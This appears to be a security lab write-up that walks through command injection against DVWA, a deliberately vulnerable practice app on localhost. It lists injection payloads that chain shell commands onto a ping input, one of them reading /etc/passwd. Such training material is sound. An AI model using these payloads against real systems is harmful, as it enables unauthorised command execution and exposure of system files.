# 💀 Command Injection – DVWA

## 📌 Overview
This task demonstrates command injection vulnerability in DVWA where user input is directly passed to system commands.

---

## 🎯 Target
- Application: DVWA  
- URL: http://localhost:8081  

---

# 🔸 Steps to Reproduce

### 🔹 Step 1: Navigate
- Login to DVWA  
- Set security level to LOW  
- Open "Command Injection"

<img width="1717" height="801" alt="dvwa-1" src="https://github.com/user-attachments/assets/2cee12b5-29e3-4608-ab93-02cd5db8cee6" />

---

### 🔹 Step 2: Normal Input
```html
127.0.0.1
```
### Result
- Ping executed normally
<img width="1718" height="798" alt="dvwa-2" src="https://github.com/user-attachments/assets/9d0fe35d-dfa6-403a-b9f4-23f7e81a751f" />

---

### 🔹 Step 3: Injection Payload
```html
127.0.0.1; ls
```
### Result
- Ping executed  
- Directory listing displayed
<img width="1720" height="798" alt="dvwa-3" src="https://github.com/user-attachments/assets/d9daa74c-fbb9-4735-b2a7-5ec25d0b45ef" />

---

### 🔹 Step 4: Additional Payloads
```html
127.0.0.1 && whoami
```
<img width="1721" height="800" alt="dvwa-4" src="https://github.com/user-attachments/assets/7184dd32-688e-4b51-a1f7-a94d726b0724" />

---

```html
127.0.0.1 | pwd
```
<img width="1719" height="796" alt="dvwa-5" src="https://github.com/user-attachments/assets/a3196792-a038-47f4-b980-980b7fb4dae3" />

---

```html
127.0.0.1; cat /etc/passwd
```
<img width="1720" height="796" alt="dvwa-6" src="https://github.com/user-attachments/assets/c839ea6e-5fc7-4079-a758-94c7844037b3" />

---

```html
127.0.0.1; uname -a
```
<img width="1718" height="793" alt="dvwa-7" src="https://github.com/user-attachments/assets/1513f0b6-af51-409f-98f3-a0036733558e" />

---

### Result
- System commands executed  
- Sensitive information exposed 

